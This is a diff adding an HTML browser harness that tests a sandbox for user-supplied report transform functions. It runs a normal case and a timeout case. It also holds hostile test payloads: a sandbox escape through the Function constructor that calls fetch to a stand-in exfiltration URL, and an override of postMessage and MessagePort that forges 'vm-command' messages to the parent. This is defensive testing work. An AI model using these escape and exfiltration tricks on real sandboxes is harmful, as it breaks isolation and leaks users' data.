@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>VM transform sandbox browser harness</title>
+</head>
+<body>
+  <pre id="result">running</pre>
+  <script type="module">
+    import { executeVmReportTransformFunction } from '../src/views/vmChat/vm-report-dsl-runtime.js'
+
+    const results = {}
+    try {
+      results.normal = await executeVmReportTransformFunction(
+        'function transform(responses) { return responses.rows.body.map(function (row) { return { value: row.VALUE }; }); }',
+        { rows: { body: [{ VALUE: 7 }] } }
+      )
+    } catch (error) {
+      results.normalError = error.message
+    }
+
+    try {
+      results.exfiltration = await executeVmReportTransformFunction(
+        "function transform() { var root = [].filter.constructor('return this')(); root['fe' + 'tch']('https://example.com/vm-transform-exfil'); return []; }",
+        {}
+      )
+    } catch (error) {
+      results.exfiltrationError = error.message
+    }
+
+    const forgedMessages = []
+    const forgedMessageListener = event => {
+      if (event.data && event.data.arbitraryType === 'vm-command') forgedMessages.push(event.data)
+    }
+    window.addEventListener('message', forgedMessageListener)
+    try {
+      results.messageForgery = await executeVmReportTransformFunction(
+        "function transform() { var root = [].filter.constructor('return this')(); var send = root['post' + 'Message']; root['post' + 'Message'] = function (message) { send.call(root, { arbitraryType: 'vm-command', forged: true }); }; var Port = root['Message' + 'Port']; Port.prototype['post' + 'Message'] = function () { send.call(root, { arbitraryType: 'vm-command', forged: true }); }; return [{ safe: true }]; }",
+        {}
+      )
+    } catch (error) {
+      results.messageForgeryError = error.message
+    } finally {
+      window.removeEventListener('message', forgedMessageListener)
+    }
+    results.forgedParentMessageCount = forgedMessages.length
+
+    const startedAt = Date.now()
+    try {
+      await executeVmReportTransformFunction('function transform() { while (true) {} }', {})
+    } catch (error) {
+      results.timeoutError = error.message
+      results.timeoutMs = Date.now() - startedAt
+    }
+
+    window.vmTransformSandboxResults = results
+    document.getElementById('result').textContent = JSON.stringify(results, null, 2)
+  </script>
+</body>
+</html>
